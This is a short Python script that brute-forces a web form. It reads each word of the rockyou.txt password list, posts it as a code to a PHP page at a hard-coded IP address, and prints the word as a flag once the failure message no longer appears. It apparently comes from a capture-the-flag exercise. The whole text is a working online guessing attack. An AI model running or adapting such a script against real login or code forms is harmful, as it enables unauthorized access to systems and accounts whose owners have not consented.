import requests

url = "http://157.230.103.12/future/delorian.php"
wordlist_path = "/home/clumzzy/rockyou.txt"  # Standard Kali path

with open(wordlist_path, "r", encoding="latin-1") as f:
    for line in f:
        word = line.strip()
        payload = {"date": "1985-10-26", "code": word}
        
        response = requests.post(url, data=payload)
        
        # Check if the failure text is missing or length is different
        if "Unfortunately you need to provide a code" not in response.text:
            print(f"[+] Flag / Valid Code Found: {word}")
            print(response.text)
            break
